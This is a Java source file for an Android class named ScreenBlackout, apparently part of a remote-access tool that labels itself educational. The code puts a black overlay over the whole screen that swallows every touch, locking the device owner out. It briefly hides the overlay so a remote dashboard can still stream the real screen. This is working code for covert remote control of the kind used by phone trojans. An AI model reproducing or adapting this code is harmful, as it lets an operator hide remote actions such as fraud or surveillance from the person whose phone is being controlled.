package com.remoteaccess.educational.commands;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import org.json.JSONObject;

/**
 * ScreenBlackout — draws a full-screen opaque black overlay using WindowManager.
 *
 * The physical device screen appears completely blank (black) and ALL touch
 * events are consumed — no app or system UI underneath receives any input.
 *
 * The dashboard receives stream frames via runWithOverlayHidden() which briefly
 * hides the overlay, captures, then restores it.
 *
 * Requires: android.permission.SYSTEM_ALERT_WINDOW
 */
public class ScreenBlackout {

    private static final String TAG = "ScreenBlackout";

    private final Context       context;
    private final WindowManager windowManager;
    private final Handler       mainHandler = new Handler(Looper.getMainLooper());

    // Synchronize all state changes to avoid race conditions
    private final Object lock = new Object();
    private View    overlayView = null;
    private boolean active      = false;
    // Track whether the view has been physically added to WindowManager
    private boolean viewAttached = false;

    private static ScreenBlackout instance;

    public static synchronized ScreenBlackout getInstance(Context context) {
        if (instance == null) instance = new ScreenBlackout(context.getApplicationContext());
        return instance;
    }

    private ScreenBlackout(Context context) {
        this.context       = context;
        this.windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
    }

    public boolean isActive() {
        synchronized (lock) { return active; }
    }

    /** Enable the black screen overlay on the device. */
    public JSONObject enableBlackout() {
        JSONObject result = new JSONObject();
        try {
            synchronized (lock) {
                if (active) {
                    result.put("success", true);
                    result.put("message", "Screen blackout already active");
                    return result;
                }
            }

            // Guard: overlay permission must be granted
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
                result.put("success", false);
                result.put("error", "Overlay permission not granted — enable 'Display over other apps' from the Permissions tab first");
                return result;
            }

            // Use a latch so we block until the view is actually attached
            final Object attachLock = new Object();
            final boolean[] attached = {false};

            mainHandler.post(() -> {
                synchronized (lock) {
                    try {
                        View v = new View(context);
                        v.setBackgroundColor(Color.BLACK);

                        // Consume ALL touch events so nothing underneath receives input
                        v.setOnTouchListener((view, event) -> true);

                        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                                : WindowManager.LayoutParams.TYPE_PHONE;

                        // Flags:
                        //   FLAG_NOT_FOCUSABLE  — don't steal keyboard focus
                        //   FLAG_LAYOUT_IN_SCREEN — extend behind status/nav bars
                        //   FLAG_FULLSCREEN     — hide status bar decorations
                        // We deliberately do NOT set FLAG_NOT_TOUCHABLE so that
                        // the overlay intercepts and consumes every touch gesture.
                        // We also do NOT set FLAG_NOT_TOUCH_MODAL so touches cannot
                        // escape to windows below.
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                type,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                        | WindowManager.LayoutParams.FLAG_FULLSCREEN
                                        | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                                PixelFormat.OPAQUE
                        );

                        windowManager.addView(v, params);
                        overlayView  = v;
                        active       = true;
                        viewAttached = true;
                        Log.i(TAG, "Screen blackout ENABLED — all touch blocked");
                    } catch (Exception e) {
                        Log.e(TAG, "enableBlackout error: " + e.getMessage());
                    }
                }
                synchronized (attachLock) {
                    attached[0] = true;
                    attachLock.notifyAll();
                }
            });

            // Wait up to 1 s for the view to attach before returning success
            synchronized (attachLock) {
                long deadline = System.currentTimeMillis() + 1000;
                while (!attached[0] && System.currentTimeMillis() < deadline) {
                    try { attachLock.wait(50); } catch (InterruptedException ignored) { break; }
                }
            }

            synchronized (lock) {
                if (active) {
                    result.put("success", true);
                    result.put("message", "Screen blackout enabled — device screen is black and touch is blocked");
                } else {
                    result.put("success", false);
                    result.put("error", "Failed to attach overlay — check permissions");
                }
            }
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /** Disable the black screen overlay. */
    public JSONObject disableBlackout() {
        JSONObject result = new JSONObject();
        try {
            synchronized (lock) {
                if (!active && !viewAttached) {
                    result.put("success", true);
                    result.put("message", "Screen blackout already inactive");
                    return result;
                }
            }

            final Object removeLock = new Object();
            final boolean[] removed = {false};

            mainHandler.post(() -> {
                synchronized (lock) {
                    try {
                        if (overlayView != null && viewAttached) {
                            windowManager.removeView(overlayView);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "disableBlackout removeView error: " + e.getMessage());
                    } finally {
                        overlayView  = null;
                        active       = false;
                        viewAttached = false;
                        Log.i(TAG, "Screen blackout DISABLED");
                    }
                }
                synchronized (removeLock) {
                    removed[0] = true;
                    removeLock.notifyAll();
                }
            });

            // Wait for removal to complete
            synchronized (removeLock) {
                long deadline = System.currentTimeMillis() + 1000;
                while (!removed[0] && System.currentTimeMillis() < deadline) {
                    try { removeLock.wait(50); } catch (InterruptedException ignored) { break; }
                }
            }

            result.put("success", true);
            result.put("message", "Screen blackout disabled — device screen is visible again");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /**
     * Briefly hide the overlay, run the capture runnable, then restore it.
     * This allows the dashboard stream to capture real screen content while
     * the physical device continues to see a black screen.
     *
     * Called from the streaming thread — briefly synchronizes with main thread.
     */
    public void runWithOverlayHidden(Runnable captureTask) {
        boolean isCurrentlyActive;
        synchronized (lock) { isCurrentlyActive = active && viewAttached && overlayView != null; }

        if (!isCurrentlyActive) {
            captureTask.run();
            return;
        }

        final Object captureLock = new Object();
        final boolean[] done = {false};

        mainHandler.post(() -> {
            View v;
            synchronized (lock) { v = overlayView; }
            try {
                if (v != null) v.setVisibility(View.INVISIBLE);
                captureTask.run();
            } finally {
                if (v != null) {
                    synchronized (lock) {
                        // Only restore if still active (not removed while capturing)
                        if (active && viewAttached) v.setVisibility(View.VISIBLE);
                    }
                }
                synchronized (captureLock) { done[0] = true; captureLock.notifyAll(); }
            }
        });

        synchronized (captureLock) {
            long deadline = System.currentTimeMillis() + 400;
            while (!done[0] && System.currentTimeMillis() < deadline) {
                try { captureLock.wait(50); } catch (InterruptedException ignored) { break; }
            }
        }
    }
}
